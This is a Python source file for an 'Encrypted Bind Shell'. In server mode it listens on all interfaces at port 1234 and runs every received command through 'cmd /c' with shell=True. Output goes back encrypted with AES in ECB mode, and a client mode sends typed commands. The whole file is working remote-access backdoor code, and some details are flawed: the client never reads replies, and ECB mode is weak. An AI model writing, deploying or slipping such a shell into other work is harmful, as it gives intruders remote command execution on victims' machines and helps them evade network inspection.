import socket
import subprocess
import threading
import argparse

# Importing necessary modules for encryption
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

# Constants for default port and buffer size
DEFAULT_PORT = 1234
MAX_BUFFER = 4096

# Class to handle AES Encryption
class AESCipher:
    def __init__(self, key=None):
        self.key = key if key else get_random_bytes(32)  # Use provided key or generate new
        self.cipher = AES.new(self.key, AES.MODE_ECB)  # ECB mode cipher
    
    def encrypt(self, plaintext):
        return self.cipher.encrypt(pad(plaintext, AES.block_size)).hex()
    
    def decrypt(self, encrypted):
        return unpad(self.cipher.decrypt(bytearray.fromhex(encrypted)), AES.block_size)
    
    def __str__(self):
        return "Key: {}".format(self.key.hex())

# Function to send encrypted data
def encrypted_send(socket, message):
    socket.send(cipher.encrypt(message).encode("latin-1"))

# Function to execute system command
def execute_cmd(command):
    try:
        output = subprocess.check_output("cmd /c {}".format(command), stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        output = f"Command failed: {str(e)}".encode()
    return output

# Function to decode and strip data
def decode_and_strip(data):
    return data.decode("latin-1").strip()

# Thread function for handling shell interactions
def shell_thread(socket):
    encrypted_send(socket, b"Connected to bind shell")

    try:
        while True:
            encrypted_send(socket, b"\nEnter command: ")
            data = socket.recv(MAX_BUFFER)
            if data:
                command = cipher.decrypt(decode_and_strip(data))
                command = decode_and_strip(command)
                if not command or command.lower() == "exit":
                    encrypted_send(socket, b"Exiting shell...")
                    socket.close()
                    break
                
                print(f"Executing command: {command}")
                result = execute_cmd(command)
                encrypted_send(socket, result)
    except Exception as e:
        print(f"Shell thread error: {str(e)}")
        socket.close()

# Function to setup and run the server
def server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind(("0.0.0.0", DEFAULT_PORT))
        server_socket.listen()
        print(f"Server listening on port {DEFAULT_PORT}. Waiting for connections...")

        while True:
            client_socket, addr = server_socket.accept()
            print(f"Connection established with {addr}")
            threading.Thread(target=shell_thread, args=(client_socket,)).start()

# Function to connect to the server as a client
def client(ip):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        client_socket.connect((ip, DEFAULT_PORT))
        print("Connected to the server. Type commands to execute them remotely.")

        while True:
            try:
                command = input() + "\n"
                encrypted_send(client_socket, command.encode("latin-1"))
            except Exception as e:
                print(f"Error sending command: {str(e)}")
                break

# Argument parsing for command line interaction
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Encrypted Bind Shell")
    parser.add_argument("-l", "--listen", action="store_true", help="Start a server and listen for incoming connections")
    parser.add_argument("-c", "--connect", help="Connect to a server as a client", metavar="IP")
    parser.add_argument("-k", "--key", help="Encryption key (32-byte hex string)", metavar="KEY", type=str)
    args = parser.parse_args()

    # Validate input arguments and setup encryption key
    if args.connect and not args.key:
        parser.error("-c/--connect requires -k/--key for encryption")

    if args.key:
        cipher = AESCipher(bytearray.fromhex(args.key))
    else:
        cipher = AESCipher()

    print(cipher)

    # Run as server or client based on arguments
    if args.listen:
        server()
    elif args.connect:
        client(args.connect)
    else:
        parser.error("No operation specified. Use -l/--listen to start server or -c/--connect to connect as client.")
